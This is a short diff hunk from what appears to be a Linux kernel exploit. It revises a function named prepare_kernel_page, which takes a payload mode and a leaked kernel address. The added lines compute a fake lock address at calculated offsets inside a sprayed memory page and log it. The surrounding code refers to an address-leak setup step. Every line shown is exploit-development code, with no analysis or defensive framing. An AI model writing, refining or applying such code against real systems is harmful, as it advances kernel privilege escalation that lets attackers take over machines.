@@ -730,6 +730,13 @@ uintptr_t prepare_kernel_page(int payload_mode, size_t cand_round) {
       cleanup_page_prepare_state();
       return 0;
     }
+    /* v37: fast path also selects the round tile */
+    {
+      size_t n_tiles = (size_t)SKB_SEND_SIZE / 0x1800;
+      size_t k = g_attempt_round % n_tiles;
+      fake_lock = (leaked & ~(ORDER3_SIZE - 1)) + (k * 0x1800) - 0xe80 + LOCK_OFF;
+      pr_info("[p5-fast] tile %zu/%zu fake_lock=%016zx\n", k, n_tiles, fake_lock);
+    }
     return leaked & ~(ORDER3_SIZE - 1);
   }
   ks = kernelsnitch_setup(
